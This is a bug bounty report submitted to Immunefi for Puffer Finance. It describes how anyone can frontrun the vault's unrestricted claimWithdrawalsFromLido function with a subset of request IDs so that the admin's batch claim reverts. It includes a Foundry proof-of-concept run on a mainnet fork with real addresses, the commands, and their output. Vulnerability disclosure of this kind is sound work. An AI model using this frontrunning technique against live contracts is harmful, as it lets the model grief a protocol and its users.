# 28698 - \[SC - Insight] User can frontrun claim transaction to make cla...

Submitted on Feb 24th 2024 at 06:46:29 UTC by @ladboy233 for [Boost | Puffer Finance](https://immunefi.com/bounty/pufferfinance-boost/)

Report ID: #28698

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0xd9a442856c234a39a81a089c06451ebaa4306a72>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

<https://etherscan.io/address/0x39ca0a6438b6050ea2ac909ba65920c7451305c1#code#F1#L106>

```
  function claimWithdrawalsFromLido(uint256[] calldata requestIds) external virtual {
        VaultStorage storage $ = _getPufferVaultStorage();

        // Tell our receive() that we are doing a Lido claim
        $.isLidoWithdrawal = true;

        for (uint256 i = 0; i < requestIds.length; ++i) {
            bool isValidWithdrawal = $.lidoWithdrawals.remove(requestIds[i]);
            if (!isValidWithdrawal) {
                revert InvalidWithdrawal();
            }

            // slither-disable-next-line calls-loop
            _LIDO_WITHDRAWAL_QUEUE.claimWithdrawal(requestIds[i]);
        }

        // Reset back the value
        $.isLidoWithdrawal = false;
        emit ClaimedWithdrawals(requestIds);
    }
```

Once the admin request the claim via LIDO withdrawal queue

anyone can call the function claimWithdrawalsFromLido and pass in an array of requests Ids to claim the ETH.

the code loops through the request Ids and call

```
_LIDO_WITHDRAWAL_QUEUE.claimWithdrawal(requestIds[i]);
```

one by one,

the problem is that suppose admin / protocol wants to withdraw using request Id \[10000, 10001 and 10002]

malicious user can frontrun the claimWithdrawalsFromLido and calls the function with only the request Id \[10000]

then when the admin's request execute, the whole transaction will revert because we cannot withdraw ETH using the request id 10000 twice.

the recommendation is adding access control to the function claimWithdrawalsFromLido

## Proof of concept

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ILidoWithdrawalQueue {
    function requestWithdrawals(uint256[] calldata _amounts, address _owner)
        external
        returns (uint256[] memory requestIds);

    function claimWithdrawal(uint256 _requestId) external;
}


contract CounterTest is Test {

    function setUp() public {

    }

    function withdrawETH(uint256[] memory requestIds) public {

        address user = 0xE5350E927B904FdB4d2AF55C566E269BB3df1941;
        
        vm.startPrank(user);

        for (uint256 i = 0; i < requestIds.length; i++) {
            ILidoWithdrawalQueue lido = ILidoWithdrawalQueue(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1);
            lido.claimWithdrawal(requestIds[i]);
        }

        vm.stopPrank();

    }

    function testWithdrawalRegular() public {

        // block number 19290411
    
        address user = 0xE5350E927B904FdB4d2AF55C566E269BB3df1941;

        ILidoWithdrawalQueue lido = ILidoWithdrawalQueue(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1);

        uint256[] memory requestIds = new uint256[](2);
        requestIds[0] = 27139;
        requestIds[1] = 27140;
        
        withdrawETH(requestIds);

    }

    function testWithdrawalFrontrun() public {

        // block number 19290411
    
        address user = 0xE5350E927B904FdB4d2AF55C566E269BB3df1941;

        ILidoWithdrawalQueue lido = ILidoWithdrawalQueue(0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1);

        uint256[] memory requestIds = new uint256[](2);
        requestIds[0] = 27139;
        requestIds[1] = 27140;
        
        uint256[] memory frontrunIds = new uint256[](1);
        frontrunIds[0] = 27139;

        withdrawETH(frontrunIds);

        withdrawETH(requestIds);

    }
}
```

first we can run

```
forge test -vvv --match-test "testWithdrawalRegular" --fork-url https://eth.llamarpc.com --fork-block-number 19290411
```

and the output is

```
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/Counter.t.sol:CounterTest
[PASS] testWithdrawalRegular() (gas: 85592)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.00ms
```

that is fine, user wants to withdraw with request id 27139 and 27140

However, if we run

```
forge test -vvv --match-test "testWithdrawalFrontrun" --fork-url https://eth.llamarpc.com --fork-block-number 19290411
```

transaction revert, because before user withdraw with request id \[27139, 27140]

user can frontrun and only withdraw \[27139]

```
      uint256[] memory requestIds = new uint256[](2);
        requestIds[0] = 27139;
        requestIds[1] = 27140;
        
        uint256[] memory frontrunIds = new uint256[](1);
        frontrunIds[0] = 27139;

        withdrawETH(frontrunIds);

        withdrawETH(requestIds);
```
